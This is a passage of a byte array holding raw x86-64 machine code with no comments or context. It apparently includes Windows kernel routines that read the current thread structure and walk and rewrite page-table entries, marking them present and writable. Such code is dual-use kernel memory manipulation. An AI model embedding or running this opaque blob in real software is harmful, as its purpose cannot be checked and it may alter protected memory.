    0x00, 0xC9, 0x80, 0xC1, 0x02, 0xEB, 0x09, 0x41, 0x80, 0xFF, 0x06, 0x0F, 0x94, 0xC1, 0x00, 0xC9,
    0x41, 0xB8, 0x02, 0x00, 0x00, 0x00, 0x41, 0x80, 0xFE, 0x03, 0x74, 0x51, 0x41, 0x80, 0xFF, 0x04,
    0x75, 0x4B, 0x41, 0x0F, 0xB6, 0x41, 0x01, 0x83, 0xCB, 0x02, 0x89, 0x5A, 0x21, 0x88, 0x42, 0x11,
    0x41, 0x89, 0xC0, 0x41, 0xC0, 0xE8, 0x06, 0x44, 0x88, 0x42, 0x12, 0x41, 0x89, 0xC0, 0x41, 0xC0,
    0xE8, 0x03, 0x41, 0x80, 0xE0, 0x07, 0x44, 0x88, 0x42, 0x13, 0x24, 0x07, 0x88, 0x42, 0x14, 0x41,
    0xB8, 0x03, 0x00, 0x00, 0x00, 0x3C, 0x05, 0x44, 0x8B, 0x7C, 0x24, 0x0C, 0x75, 0x14, 0x41, 0x80,
    0xE6, 0x01, 0x75, 0x0E, 0x49, 0x83, 0xC1, 0x02, 0x4D, 0x89, 0xC8, 0xEB, 0x31, 0x44, 0x8B, 0x7C,
    0x24, 0x0C, 0x4D, 0x01, 0xC8, 0x49, 0xFF, 0xC8, 0x80, 0xF9, 0x04, 0x74, 0x21, 0x44, 0x0F, 0xB6,
    0xC9, 0x41, 0x83, 0xF9, 0x02, 0x74, 0x2A, 0x41, 0x83, 0xF9, 0x01, 0x75, 0x37, 0x83, 0xCB, 0x40,
    0x89, 0x5A, 0x21, 0x41, 0x0F, 0xB6, 0x00, 0x88, 0x42, 0x1D, 0xB1, 0x01, 0xEB, 0x26, 0x81, 0xCB,
    0x00, 0x01, 0x00, 0x00, 0x89, 0x5A, 0x21, 0x41, 0x8B, 0x00, 0x89, 0x42, 0x1D, 0xB1, 0x04, 0xEB,
    0x13, 0x81, 0xCB, 0x80, 0x00, 0x00, 0x00, 0x89, 0x5A, 0x21, 0x41, 0x0F, 0xB7, 0x00, 0x66, 0x89,
    0x42, 0x1D, 0xB1, 0x02, 0x44, 0x0F, 0xB6, 0xC9, 0x4D, 0x01, 0xC1, 0x89, 0xDD, 0x40, 0xF6, 0xC6,
    0x10, 0x0F, 0x84, 0x5C, 0xFC, 0xFF, 0xFF, 0x40, 0xF6, 0xC6, 0x40, 0x75, 0x21, 0x45, 0x84, 0xFF,
    0x74, 0x40, 0x83, 0xCD, 0x20, 0x89, 0x6A, 0x21, 0x49, 0x8B, 0x01, 0x48, 0x89, 0x42, 0x15, 0x49,
    0x83, 0xC1, 0x08, 0x40, 0xF6, 0xC6, 0x04, 0x75, 0x49, 0xE9, 0x3F, 0xFC, 0xFF, 0xFF, 0x41, 0xF6,
    0xC2, 0x08, 0x0F, 0x84, 0x87, 0x00, 0x00, 0x00, 0x81, 0xCD, 0x08, 0x02, 0x00, 0x00, 0x89, 0x6A,
    0x21, 0x41, 0x0F, 0xB7, 0x01, 0x66, 0x89, 0x42, 0x15, 0x49, 0x83, 0xC1, 0x02, 0xE9, 0x80, 0x00,
    0x00, 0x00, 0x41, 0xF6, 0xC2, 0x08, 0x75, 0x1A, 0x83, 0xCD, 0x10, 0x89, 0x6A, 0x21, 0x41, 0x8B,
    0x01, 0x89, 0x42, 0x15, 0x49, 0x83, 0xC1, 0x04, 0x40, 0xF6, 0xC6, 0x04, 0x0F, 0x84, 0xFB, 0xFB,
    0xFF, 0xFF, 0x83, 0xCD, 0x08, 0x89, 0x6A, 0x21, 0x41, 0x0F, 0xB7, 0x01, 0x66, 0x89, 0x42, 0x15,
    0x49, 0x83, 0xC1, 0x02, 0x40, 0xF6, 0xC6, 0x02, 0x0F, 0x84, 0xE9, 0xFB, 0xFF, 0xFF, 0x83, 0xCD,
    0x04, 0x89, 0x6A, 0x21, 0x41, 0x0F, 0xB6, 0x01, 0x49, 0xFF, 0xC1, 0x88, 0x42, 0x15, 0x40, 0xF6,
    0xC6, 0x40, 0x75, 0x1B, 0x40, 0xF6, 0xC6, 0x20, 0x74, 0x28, 0x81, 0xCD, 0x04, 0x02, 0x00, 0x00,
    0x89, 0x6A, 0x21, 0x41, 0x0F, 0xB6, 0x01, 0x49, 0xFF, 0xC1, 0x88, 0x42, 0x15, 0xEB, 0x13, 0x81,
    0xCD, 0x10, 0x02, 0x00, 0x00, 0x89, 0x6A, 0x21, 0x41, 0x8B, 0x01, 0x89, 0x42, 0x15, 0x49, 0x83,
    0xC1, 0x04, 0x4D, 0x29, 0xE9, 0x44, 0x88, 0x0A, 0x41, 0xF6, 0xC1, 0xF0, 0x74, 0x0F, 0x81, 0xCD,
    0x00, 0x50, 0x00, 0x00, 0x89, 0x6A, 0x21, 0xC6, 0x02, 0x0F, 0x41, 0xB1, 0x0F, 0x41, 0x0F, 0xB6,
    0xC1, 0x48, 0x83, 0xC4, 0x10, 0x5B, 0x5D, 0x5F, 0x5E, 0x41, 0x5C, 0x41, 0x5D, 0x41, 0x5E, 0x41,
    0x5F, 0xC3, 0x41, 0xF6, 0xC2, 0x06, 0x0F, 0x85, 0xC2, 0xFD, 0xFF, 0xFF, 0xE9, 0xC6, 0xFD, 0xFF,
    0xFF, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x56, 0x57, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x89, 0xCE, 0x48, 0x8B, 0x15, 0x28, 0x52, 0x04, 0x00,
    0x65, 0x48, 0x8B, 0x3C, 0x25, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0x28, 0xA0, 0x00, 0x00,
    0x48, 0x8B, 0x05, 0x79, 0xA7, 0x00, 0x00, 0x48, 0x39, 0x04, 0x39, 0x74, 0x52, 0x48, 0x8B, 0x0D,
    0x0C, 0xA0, 0x00, 0x00, 0x48, 0x39, 0x04, 0x39, 0x75, 0x45, 0x48, 0x8D, 0x0D, 0xE0, 0x75, 0x00,
    0x00, 0x48, 0x89, 0xD3, 0x48, 0x8D, 0x15, 0x09, 0x92, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x56, 0x8B,
    0x00, 0x00, 0xFF, 0x15, 0xD0, 0xA6, 0x00, 0x00, 0x48, 0x89, 0xDA, 0x48, 0x8B, 0x05, 0xE6, 0x9F,
    0x00, 0x00, 0x48, 0x8B, 0x0D, 0x37, 0xA7, 0x00, 0x00, 0x48, 0x87, 0x0C, 0x38, 0x48, 0x8B, 0x05,
    0xCC, 0x9F, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0x25, 0xA7, 0x00, 0x00, 0x48, 0x87, 0x0C, 0x38, 0x89,
    0xF1, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0x5F, 0x5E, 0x48, 0xFF, 0xE2, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x56, 0x57, 0x48, 0x83, 0xEC, 0x28, 0xB9, 0x00, 0x10, 0x00, 0x00, 0xE8, 0xB0, 0x20, 0x00, 0x00,
    0x48, 0x85, 0xC0, 0x74, 0x6F, 0x48, 0x89, 0xC7, 0x48, 0x89, 0xC1, 0xE8, 0x10, 0x38, 0x00, 0x00,
    0x48, 0x85, 0xC0, 0x74, 0x68, 0x48, 0x89, 0xC6, 0x8B, 0x05, 0x52, 0x51, 0x04, 0x00, 0x48, 0x98,
    0x48, 0x39, 0x05, 0x51, 0x51, 0x04, 0x00, 0x76, 0x5D, 0xB8, 0x01, 0x00, 0x00, 0x00, 0xF0, 0x0F,
    0xC1, 0x05, 0x3A, 0x51, 0x04, 0x00, 0x48, 0x98, 0x48, 0x39, 0x05, 0x39, 0x51, 0x04, 0x00, 0x76,
    0x62, 0x48, 0x8B, 0x0D, 0x20, 0x51, 0x04, 0x00, 0x48, 0x89, 0xFA, 0x48, 0x87, 0x14, 0xC1, 0x48,
    0x89, 0x7C, 0x24, 0x20, 0x48, 0x8D, 0x0D, 0x5A, 0x63, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x52, 0x91,
    0x00, 0x00, 0x4C, 0x8D, 0x05, 0xC6, 0x83, 0x00, 0x00, 0x49, 0x89, 0xF1, 0xFF, 0x15, 0x16, 0xA6,
    0x00, 0x00, 0xEB, 0x53, 0x48, 0x8D, 0x0D, 0x8E, 0x84, 0x00, 0x00, 0xEB, 0x34, 0x48, 0x8D, 0x0D,
    0xF0, 0x73, 0x00, 0x00, 0xEB, 0x2B, 0x48, 0x8D, 0x0D, 0x5F, 0x80, 0x00, 0x00, 0x48, 0x8D, 0x15,
    0x1A, 0x91, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xB3, 0x83, 0x00, 0x00, 0xFF, 0x15, 0xE7, 0xA5, 0x00,
    0x00, 0xEB, 0x07, 0xF0, 0xFF, 0x0D, 0xC6, 0x50, 0x04, 0x00, 0x48, 0x8D, 0x0D, 0x85, 0x84, 0x00,
    0x00, 0x48, 0x8D, 0x15, 0xF6, 0x90, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x70, 0x83, 0x00, 0x00, 0xFF,
    0x15, 0xC3, 0xA5, 0x00, 0x00, 0x31, 0xF6, 0x48, 0x89, 0xF0, 0x48, 0x83, 0xC4, 0x28, 0x5F, 0x5E,
    0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x41, 0x57, 0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x56, 0x57, 0x55, 0x53, 0x48, 0x83, 0xEC, 0x48,
    0x48, 0x89, 0xD6, 0x49, 0x89, 0xCE, 0x48, 0x8D, 0x0D, 0xE3, 0x78, 0x00, 0x00, 0x48, 0x8D, 0x15,
    0xB0, 0x90, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xDD, 0x77, 0x00, 0x00, 0xFF, 0x15, 0x77, 0xA5, 0x00,
    0x00, 0x48, 0x81, 0xC6, 0xFF, 0x0F, 0x00, 0x00, 0x48, 0x89, 0xF3, 0x48, 0xC1, 0xEB, 0x0C, 0x4C,
    0x8D, 0x24, 0xDD, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x89, 0xE1, 0xE8, 0x81, 0x1F, 0x00, 0x00, 0x48,
    0x89, 0xC7, 0x4C, 0x89, 0x64, 0x24, 0x20, 0x48, 0x8D, 0x0D, 0xBB, 0x69, 0x00, 0x00, 0x48, 0x8D,
    0x15, 0x74, 0x90, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x04, 0x61, 0x00, 0x00, 0x49, 0x89, 0xC1, 0xFF,
    0x15, 0x33, 0xA5, 0x00, 0x00, 0x48, 0x89, 0x7C, 0x24, 0x40, 0x48, 0x85, 0xFF, 0x74, 0x29, 0x41,
    0xB7, 0x01, 0x48, 0x81, 0xFE, 0x00, 0x10, 0x00, 0x00, 0x73, 0x40, 0x48, 0x8D, 0x0D, 0x9D, 0x77,
    0x00, 0x00, 0x48, 0x8D, 0x15, 0x2D, 0x90, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x68, 0x77, 0x00, 0x00,
    0x49, 0x89, 0xD9, 0xE9, 0xC7, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0xC5, 0x61, 0x00, 0x00, 0x48,
    0x8D, 0x15, 0x18, 0x90, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x4B, 0x77, 0x00, 0x00, 0xFF, 0x15, 0xE5,
    0xA4, 0x00, 0x00, 0x45, 0x31, 0xFF, 0xE9, 0xDE, 0x01, 0x00, 0x00, 0x48, 0x83, 0xFB, 0x01, 0x48,
    0x89, 0xDF, 0x48, 0x83, 0xD7, 0x00, 0xE8, 0x35, 0xFE, 0xFF, 0xFF, 0x48, 0x85, 0xC0, 0x0F, 0x84,
    0x6E, 0x01, 0x00, 0x00, 0x49, 0x89, 0xC5, 0x4C, 0x89, 0x64, 0x24, 0x38, 0x48, 0xFF, 0xCF, 0x31,
    0xED, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x2E, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x48, 0x89, 0xE8, 0x48, 0xC1, 0xE8, 0x02, 0x48, 0xB9, 0xC3, 0xF5, 0x28, 0x5C, 0x8F, 0xC2, 0xF5,
    0x28, 0x48, 0xF7, 0xE1, 0x48, 0x89, 0xD6, 0x48, 0x8B, 0x44, 0x24, 0x40, 0x4C, 0x89, 0x2C, 0xE8,
    0xB9, 0x00, 0x10, 0x00, 0x00, 0xE8, 0xA6, 0x1E, 0x00, 0x00, 0x49, 0x89, 0xC7, 0x48, 0xC7, 0x44,
    0x24, 0x20, 0x00, 0x10, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0xDC, 0x68, 0x00, 0x00, 0x48, 0x8D, 0x15,
    0x95, 0x8F, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x25, 0x60, 0x00, 0x00, 0x49, 0x89, 0xC1, 0xFF, 0x15,
    0x54, 0xA4, 0x00, 0x00, 0x4D, 0x85, 0xFF, 0x0F, 0x84, 0x60, 0x01, 0x00, 0x00, 0x41, 0xB8, 0x00,
    0x10, 0x00, 0x00, 0x4C, 0x89, 0xF9, 0x4C, 0x89, 0xF2, 0xFF, 0x15, 0x41, 0xA4, 0x00, 0x00, 0x41,
    0xB8, 0x00, 0x10, 0x00, 0x00, 0x4C, 0x89, 0xE9, 0x4C, 0x89, 0xFA, 0x45, 0x31, 0xC9, 0xE8, 0xDD,
    0x3F, 0x00, 0x00, 0x41, 0x89, 0xC4, 0x85, 0xC0, 0x78, 0x36, 0x48, 0xC1, 0xEE, 0x02, 0x48, 0x6B,
    0xC6, 0x64, 0x48, 0x39, 0xE8, 0x75, 0x47, 0x4C, 0x89, 0x6C, 0x24, 0x28, 0x4C, 0x89, 0x74, 0x24,
    0x20, 0x48, 0x8D, 0x0D, 0xE4, 0x66, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x25, 0x8F, 0x00, 0x00, 0x4C,
    0x8D, 0x05, 0x52, 0x76, 0x00, 0x00, 0x49, 0x89, 0xE9, 0xEB, 0x1D, 0x0F, 0x1F, 0x44, 0x00, 0x00,
    0x48, 0x8D, 0x0D, 0x0C, 0x64, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x00, 0x8F, 0x00, 0x00, 0x4C, 0x8D,
    0x05, 0x33, 0x76, 0x00, 0x00, 0x4D, 0x89, 0xE9, 0xFF, 0x15, 0xCA, 0xA3, 0x00, 0x00, 0x48, 0xC7,
    0x44, 0x24, 0x20, 0x00, 0x10, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0xF5, 0x67, 0x00, 0x00, 0x48, 0x8D,
    0x15, 0xE4, 0x8E, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x73, 0x5F, 0x00, 0x00, 0x4D, 0x89, 0xF9, 0xFF,
    0x15, 0xA3, 0xA3, 0x00, 0x00, 0xBA, 0x00, 0x10, 0x00, 0x00, 0x4C, 0x89, 0xF9, 0xFF, 0x15, 0x55,
    0xA1, 0x00, 0x00, 0x45, 0x85, 0xE4, 0x0F, 0x88, 0xBF, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x75, 0x01,
    0x48, 0x39, 0xEF, 0x0F, 0x84, 0xBC, 0x00, 0x00, 0x00, 0xE8, 0xE2, 0xFC, 0xFF, 0xFF, 0x49, 0x89,
    0xC5, 0x49, 0x81, 0xC6, 0x00, 0x10, 0x00, 0x00, 0x48, 0x89, 0xF5, 0x48, 0x85, 0xC0, 0x0F, 0x85,
    0xBC, 0xFE, 0xFF, 0xFF, 0x48, 0x39, 0xDE, 0x41, 0x0F, 0x93, 0xC7, 0x4C, 0x8B, 0x64, 0x24, 0x38,
    0xEB, 0x05, 0x45, 0x31, 0xFF, 0x31, 0xF6, 0x48, 0x8D, 0x0D, 0x51, 0x6C, 0x00, 0x00, 0x48, 0x8D,
    0x15, 0x69, 0x8E, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x9C, 0x75, 0x00, 0x00, 0x49, 0x89, 0xF1, 0xFF,
    0x15, 0x33, 0xA3, 0x00, 0x00, 0x4C, 0x89, 0x64, 0x24, 0x20, 0x48, 0x8D, 0x0D, 0x62, 0x67, 0x00,
    0x00, 0x48, 0x8D, 0x15, 0x51, 0x8E, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xE0, 0x5E, 0x00, 0x00, 0x48,
    0x8B, 0x74, 0x24, 0x40, 0x49, 0x89, 0xF1, 0xFF, 0x15, 0x0B, 0xA3, 0x00, 0x00, 0x48, 0x89, 0xF1,
    0x4C, 0x89, 0xE2, 0xFF, 0x15, 0xBF, 0xA0, 0x00, 0x00, 0x44, 0x89, 0xF8, 0x48, 0x83, 0xC4, 0x48,
    0x5B, 0x5D, 0x5F, 0x5E, 0x41, 0x5C, 0x41, 0x5D, 0x41, 0x5E, 0x41, 0x5F, 0xC3, 0x48, 0x8D, 0x0D,
    0xB3, 0x6B, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x03, 0x8E, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x36, 0x75,
    0x00, 0x00, 0x49, 0x89, 0xE9, 0xFF, 0x15, 0xCD, 0xA2, 0x00, 0x00, 0x45, 0x31, 0xFF, 0x4C, 0x8B,
    0x64, 0x24, 0x38, 0xEB, 0x90, 0x48, 0x39, 0xDE, 0x41, 0x0F, 0x93, 0xC7, 0x4C, 0x8B, 0x64, 0x24,
    0x38, 0xE9, 0x95, 0xFD, 0xFF, 0xFF, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x41, 0x56, 0x56, 0x57, 0x53, 0x48, 0x83, 0xEC, 0x48, 0x48, 0x89, 0xD6, 0x48, 0x89, 0xCF, 0x48,
    0x8B, 0x42, 0x10, 0x49, 0x89, 0xC1, 0x49, 0xC1, 0xE9, 0x27, 0x41, 0x81, 0xE1, 0xFF, 0x01, 0x00,
    0x00, 0x44, 0x89, 0x4A, 0x18, 0x48, 0x89, 0xC1, 0x48, 0xC1, 0xE9, 0x1E, 0x81, 0xE1, 0xFF, 0x01,
    0x00, 0x00, 0x89, 0x4A, 0x1C, 0xC1, 0xE8, 0x15, 0x25, 0xFF, 0x01, 0x00, 0x00, 0x89, 0x42, 0x20,
    0x89, 0x44, 0x24, 0x28, 0x89, 0x4C, 0x24, 0x20, 0x48, 0x8D, 0x0D, 0xED, 0x88, 0x00, 0x00, 0x48,
    0x8D, 0x15, 0x7E, 0x8D, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x77, 0x73, 0x00, 0x00, 0xFF, 0x15, 0x45,
    0xA2, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x40, 0x00, 0x00, 0x00, 0x00, 0x8B, 0x5E, 0x18, 0xC1,
    0xE3, 0x03, 0x48, 0x01, 0xFB, 0x48, 0x8D, 0x54, 0x24, 0x40, 0x41, 0xB8, 0x08, 0x00, 0x00, 0x00,
    0x48, 0x89, 0xD9, 0x45, 0x31, 0xC9, 0xE8, 0xA5, 0x3C, 0x00, 0x00, 0x85, 0xC0, 0x78, 0x72, 0x49,
    0xBE, 0x00, 0xF0, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x48, 0x8B, 0x7C, 0x24, 0x40, 0x40, 0xF6,
    0xC7, 0x01, 0x75, 0x69, 0xE8, 0x67, 0xFB, 0xFF, 0xFF, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0x45, 0x01,
    0x00, 0x00, 0x48, 0x89, 0xC7, 0x48, 0xB8, 0xF8, 0x0F, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x48,
    0x23, 0x44, 0x24, 0x40, 0x48, 0x89, 0xF9, 0x4C, 0x21, 0xF1, 0x48, 0x09, 0xC1, 0x48, 0x83, 0xC9,
    0x03, 0x48, 0x89, 0x4C, 0x24, 0x40, 0x48, 0x8D, 0x54, 0x24, 0x40, 0x41, 0xB8, 0x08, 0x00, 0x00,
    0x00, 0x48, 0x89, 0xD9, 0x45, 0x31, 0xC9, 0xE8, 0x74, 0x3D, 0x00, 0x00, 0x85, 0xC0, 0x0F, 0x88,
    0x0C, 0x01, 0x00, 0x00, 0x48, 0x89, 0x7E, 0x28, 0x48, 0x8D, 0x0D, 0xE3, 0x63, 0x00, 0x00, 0xEB,
    0x16, 0x48, 0x8D, 0x0D, 0x4E, 0x8D, 0x00, 0x00, 0xE9, 0x0C, 0x01, 0x00, 0x00, 0x4C, 0x21, 0xF7,
    0x48, 0x8D, 0x0D, 0xF5, 0x63, 0x00, 0x00, 0x48, 0x8D, 0x15, 0xB6, 0x8C, 0x00, 0x00, 0x4C, 0x8D,
    0x05, 0xAF, 0x72, 0x00, 0x00, 0x49, 0x89, 0xF9, 0xFF, 0x15, 0x7A, 0xA1, 0x00, 0x00, 0x48, 0xC7,
    0x44, 0x24, 0x38, 0x00, 0x00, 0x00, 0x00, 0x8B, 0x5E, 0x1C, 0xC1, 0xE3, 0x03, 0x48, 0x01, 0xFB,
    0x48, 0x8D, 0x54, 0x24, 0x38, 0x41, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x48, 0x89, 0xD9, 0x45, 0x31,
    0xC9, 0xE8, 0xDA, 0x3B, 0x00, 0x00, 0x85, 0xC0, 0x78, 0x72, 0x4C, 0x8B, 0x4C, 0x24, 0x38, 0x41,
    0xF6, 0xC1, 0x01, 0x75, 0x70, 0xE8, 0xA6, 0xFA, 0xFF, 0xFF, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0x96,
    0x00, 0x00, 0x00, 0x48, 0x89, 0xC7, 0x48, 0xB8, 0xF8, 0x0F, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF,
    0x48, 0x23, 0x44, 0x24, 0x38, 0x49, 0x21, 0xFE, 0x49, 0x09, 0xC6, 0x49, 0x83, 0xCE, 0x03, 0x4C,
    0x89, 0x74, 0x24, 0x38, 0x48, 0x8D, 0x54, 0x24, 0x38, 0x41, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x48,
    0x89, 0xD9, 0x45, 0x31, 0xC9, 0xE8, 0xB6, 0x3C, 0x00, 0x00, 0x85, 0xC0, 0x78, 0x64, 0x48, 0x89,
    0x7E, 0x30, 0x48, 0x8D, 0x0D, 0x80, 0x63, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x14, 0x8C, 0x00, 0x00,
    0x4C, 0x8D, 0x05, 0x0D, 0x72, 0x00, 0x00, 0x49, 0x89, 0xF9, 0xEB, 0x21, 0x48, 0x8D, 0x0D, 0x3B,
    0x8C, 0x00, 0x00, 0xEB, 0x44, 0x4D, 0x21, 0xF1, 0x48, 0x8D, 0x0D, 0x82, 0x63, 0x00, 0x00, 0x48,
    0x8D, 0x15, 0xEE, 0x8B, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xE7, 0x71, 0x00, 0x00, 0xFF, 0x15, 0xB5,
    0xA0, 0x00, 0x00, 0xB0, 0x01, 0xEB, 0x38, 0x48, 0x8D, 0x0D, 0x12, 0x8B, 0x00, 0x00, 0xEB, 0x19,
    0x48, 0x8D, 0x0D, 0x2D, 0x8C, 0x00, 0x00, 0xEB, 0x10, 0x48, 0x8D, 0x0D, 0x67, 0x8C, 0x00, 0x00,
    0xEB, 0x07, 0x48, 0x8D, 0x0D, 0xD3, 0x8B, 0x00, 0x00, 0x48, 0x8D, 0x15, 0xAE, 0x8B, 0x00, 0x00,
    0x4C, 0x8D, 0x05, 0xAD, 0x71, 0x00, 0x00, 0xFF, 0x15, 0x7B, 0xA0, 0x00, 0x00, 0x31, 0xC0, 0x48,
    0x83, 0xC4, 0x48, 0x5B, 0x5F, 0x5E, 0x41, 0x5E, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x41, 0x57, 0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x56, 0x57, 0x55, 0x53, 0x48, 0x83, 0xEC, 0x68,
    0x48, 0x89, 0xCF, 0xBE, 0xFF, 0x0F, 0x00, 0x00, 0x48, 0x03, 0x71, 0x08, 0x48, 0x89, 0xF3, 0x48,
    0xC1, 0xEB, 0x0C, 0x8B, 0x41, 0x20, 0x89, 0x44, 0x24, 0x20, 0x48, 0x8D, 0x0D, 0x92, 0x69, 0x00,
    0x00, 0x48, 0x8D, 0x15, 0x5C, 0x8B, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x9D, 0x72, 0x00, 0x00, 0x49,
    0x89, 0xD9, 0xFF, 0x15, 0x20, 0xA0, 0x00, 0x00, 0x41, 0xB6, 0x01, 0x48, 0x81, 0xFE, 0x00, 0x10,
    0x00, 0x00, 0x73, 0x31, 0x48, 0x8B, 0x0D, 0xBD, 0x4A, 0x04, 0x00, 0xE8, 0x60, 0x31, 0x00, 0x00,
    0xE8, 0x3B, 0x31, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x2E, 0x73, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x13,
    0x8B, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x62, 0x72, 0x00, 0x00, 0xFF, 0x15, 0xE8, 0x9F, 0x00, 0x00,
    0xE9, 0xFC, 0x02, 0x00, 0x00, 0x48, 0x83, 0xFB, 0x01, 0x48, 0x89, 0xD8, 0x48, 0x83, 0xD0, 0x00,
    0x48, 0x89, 0x44, 0x24, 0x50, 0x45, 0x31, 0xF6, 0x48, 0x8D, 0x6C, 0x24, 0x40, 0x45, 0x31, 0xFF,
    0x31, 0xC9, 0x48, 0x89, 0xC8, 0x48, 0xC1, 0xE8, 0x09, 0x03, 0x47, 0x20, 0x48, 0x89, 0x4C, 0x24,
    0x58, 0x81, 0xE1, 0xFF, 0x01, 0x00, 0x00, 0x48, 0x89, 0x4C, 0x24, 0x48, 0x4C, 0x89, 0x74, 0x24,
    0x38, 0x48, 0x89, 0x44, 0x24, 0x28, 0x74, 0x18, 0x44, 0x8D, 0x34, 0xC5, 0x00, 0x00, 0x00, 0x00,
    0xE9, 0x8A, 0x00, 0x00, 0x00, 0x66, 0x66, 0x2E, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xE8, 0xEB, 0xF8, 0xFF, 0xFF, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0x4C, 0x02, 0x00, 0x00, 0x49, 0x89,
    0xC4, 0x48, 0xB9, 0x00, 0xF0, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x48, 0x21, 0xC8, 0x48, 0x83,
    0xC8, 0x03, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x74, 0x24, 0x28, 0x44, 0x8D, 0x34, 0xF5,
    0x00, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0x6F, 0x30, 0x4D, 0x01, 0xF5, 0x41, 0xB8, 0x08, 0x00, 0x00,
    0x00, 0x4C, 0x89, 0xE9, 0x48, 0x8D, 0x54, 0x24, 0x30, 0x41, 0xB1, 0x01, 0xE8, 0xEF, 0x3A, 0x00,
    0x00, 0x4C, 0x8B, 0x15, 0x30, 0x9F, 0x00, 0x00, 0x85, 0xC0, 0x0F, 0x88, 0x1C, 0x02, 0x00, 0x00,
    0x89, 0x74, 0x24, 0x20, 0x48, 0x8D, 0x0D, 0x55, 0x85, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x42, 0x8A,
    0x00, 0x00, 0x4C, 0x8D, 0x05, 0x83, 0x71, 0x00, 0x00, 0x4D, 0x89, 0xE1, 0x41, 0xFF, 0xD2, 0x48,
    0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x03, 0x77, 0x30, 0x41, 0xB8, 0x08, 0x00,
    0x00, 0x00, 0x4C, 0x89, 0xF1, 0x48, 0x8D, 0x54, 0x24, 0x30, 0x41, 0xB1, 0x01, 0xE8, 0x6E, 0x39,
    0x00, 0x00, 0x85, 0xC0, 0x0F, 0x88, 0x8E, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48,
    0xB9, 0x00, 0xF0, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x48, 0x21, 0xC8, 0x48, 0x8B, 0x4C, 0x24,
    0x48, 0x8D, 0x0C, 0xCD, 0x00, 0x00, 0x00, 0x00, 0x48, 0x09, 0xC1, 0x48, 0x89, 0x4C, 0x24, 0x60,
    0xEB, 0x19, 0x66, 0x66, 0x66, 0x66, 0x66, 0x2E, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x49, 0xFF, 0xC7, 0x85, 0xC9, 0x0F, 0x85, 0x25, 0x01, 0x00, 0x00, 0x8B, 0x05, 0x7F, 0x49, 0x04,
    0x00, 0x48, 0x98, 0x49, 0x39, 0xC7, 0x0F, 0x83, 0x1D, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x65,
    0x49, 0x04, 0x00, 0x4A, 0x8B, 0x0C, 0xF8, 0xE8, 0x14, 0x30, 0x00, 0x00, 0x49, 0x89, 0xC6, 0x41,
    0xB5, 0x01, 0x48, 0x3B, 0x47, 0x28, 0x74, 0x08, 0x4C, 0x3B, 0x77, 0x30, 0x41, 0x0F, 0x94, 0xC5,
    0x45, 0x31, 0xE4, 0x31, 0xF6, 0xEB, 0x18, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
